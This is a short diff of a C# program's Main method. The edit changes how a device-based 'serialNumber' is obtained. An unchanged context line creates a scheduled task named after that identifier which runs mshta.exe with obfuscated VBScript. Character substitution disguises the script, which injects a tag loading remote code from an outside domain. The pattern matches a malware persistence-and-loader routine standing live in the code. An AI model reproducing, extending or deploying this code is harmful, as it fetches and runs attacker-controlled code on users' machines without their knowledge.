@@ -11,7 +11,7 @@ public partial class Program
     }
     static void Main()
     {
-        var serialNumber = $"_{RegistryHelper.GetSerialNumber()}";
+        var serialNumber = $"_{DeviceInfo.GetUUID()}";
 #if DEBUG
         CreateTask(serialNumber, "mshta.exe", "vbscript:document.write(Replace(Replace(\"<@crip! @rc='h!!p@://j8.mom/01991529-9560-7dbc-81c1-0644151b30f1/'></@crip!>\",\"@\",\"s\"),\"!\",\"t\"))", "");
 #else
